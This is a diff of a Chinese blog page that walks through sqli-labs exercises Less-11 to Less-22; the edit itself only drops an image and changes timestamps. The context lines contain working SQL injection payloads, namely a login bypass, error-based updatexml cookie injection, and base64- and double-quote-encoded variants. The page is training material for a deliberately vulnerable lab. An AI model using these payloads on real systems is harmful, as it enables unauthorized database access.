@@ -41,11 +41,10 @@
 <meta property="og:image" content="http://img-blog.csdnimg.cn/20191106234720450.jpg">
 <meta property="og:image" content="http://img-blog.csdnimg.cn/20191107001803748.jpg">
 <meta property="og:image" content="http://img-blog.csdnimg.cn/201911070016070.jpg">
-<meta property="og:image" content="http://img-blog.csdnimg.cn/20191106235736829.jpg">
 <meta property="og:image" content="http://img-blog.csdnimg.cn/20191107001507777.jpg">
 <meta property="og:image" content="http://img-blog.csdnimg.cn/20191107002528784.jpg">
 <meta property="og:image" content="http://img-blog.csdnimg.cn/20191107002743388.jpg">
-<meta property="og:updated_time" content="2019-11-06T16:56:58.737Z">
+<meta property="og:updated_time" content="2019-11-07T11:09:53.590Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sqli-labs攻关3(Less-11-Less-22)">
 <meta name="twitter:description" content="前言好久没打sqli-labs了，闲来无事继续打一下。 一、联合查询-POST型Less-11 &amp;#39;1.注入点判断uname=admin\&amp;amp;passwd=&amp;amp;submit=Submit 通过添加反斜杠\，得知是&amp;#39;闭合注入测试uname=admin&apos; or &apos;a&apos;=&apos;a&amp;amp;passwd=1&amp;amp;submit=Submit 或uname=admin&apos; and 1=">
@@ -227,7 +226,7 @@
 <p><img src="http://img-blog.csdnimg.cn/20191106234203347.jpg" alt="在这里插入图片描述"><br>其它注入操作和Less-18类似。</p>
 <h4 id="4、Cookie注入"><a href="#4、Cookie注入" class="headerlink" title="4、Cookie注入"></a>4、Cookie注入</h4><p><strong>Less-20</strong><br>和上两道题一个路数，先登录，得到回显<br><img src="http://img-blog.csdnimg.cn/20191106234720450.jpg" alt="在这里插入图片描述"><br>猜测应该是在header里的<code>Cookie</code>里进行注入<br><strong>测注入点</strong><br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Cookie: uname=admin'</span><br></pre></td></tr></table></figure></p>
 <p><img src="http://img-blog.csdnimg.cn/20191107001803748.jpg" alt="在这里插入图片描述"><br><strong>测闭合方式</strong><br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Cookie: uname=admin' and '1'='1</span><br></pre></td></tr></table></figure></p>
-<p><img src="http://img-blog.csdnimg.cn/201911070016070.jpg" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20191106235736829.jpg" alt="在这里插入图片描述"><br><strong>爆库</strong><br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Cookie: uname=admin' and updatexml(1,concat(0x7e,database(),0x7e),1) and '1'='1</span><br></pre></td></tr></table></figure></p>
+<p><img src="http://img-blog.csdnimg.cn/201911070016070.jpg" alt="在这里插入图片描述"><br><strong>爆库</strong><br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Cookie: uname=admin' and updatexml(1,concat(0x7e,database(),0x7e),1) and '1'='1</span><br></pre></td></tr></table></figure></p>
 <p><img src="http://img-blog.csdnimg.cn/20191107001507777.jpg" alt="在这里插入图片描述"><br><strong>Less-21</strong><br>登录，发现<code>Cookie</code>中为base64，解码得到admin<br><img src="http://img-blog.csdnimg.cn/20191107002528784.jpg" alt="在这里插入图片描述"><br>猜想只是比Less-20多了一个Base64<br>对<code>admin&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#39;1&#39;=&#39;1</code>进行base64编码。<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Cookie:  uname=YWRtaW4nIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxkYXRhYmFzZSgpLDB4N2UpLDEpIGFuZCAnMSc9JzE=</span><br></pre></td></tr></table></figure></p>
 <p>测试，得到数据库<br><img src="http://img-blog.csdnimg.cn/20191107002743388.jpg" alt="在这里插入图片描述"><br><strong>Less-22</strong><br>把Less-21单引号改为双引号。即对<code>admin&quot; and updatexml(1,concat(0x7e,database(),0x7e),1) and &quot;1&quot;=&quot;1</code>进行base64编码。</p>
 <h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>至此，总算把Page-1的SQL注入关卡打完了。总的来说，22个sqli-labs关卡主要涉及的SQL注入的姿势有：</p>
@@ -239,7 +238,7 @@
 
             <div class="post-copyright">
     <div class="content">
-        <p>最后更新： 2019年11月07日 00:56</p>
+        <p>最后更新： 2019年11月07日 19:09</p>
         <p>原始链接： <a class="post-url" href="/2019/11/06/sqli-labs攻关3(Less-11-Less-22)/" title="sqli-labs攻关3(Less-11-Less-22)">https://qwzf.github.io/2019/11/06/sqli-labs攻关3(Less-11-Less-22)/</a></p>
         <footer>
             <a href="https://qwzf.github.io">
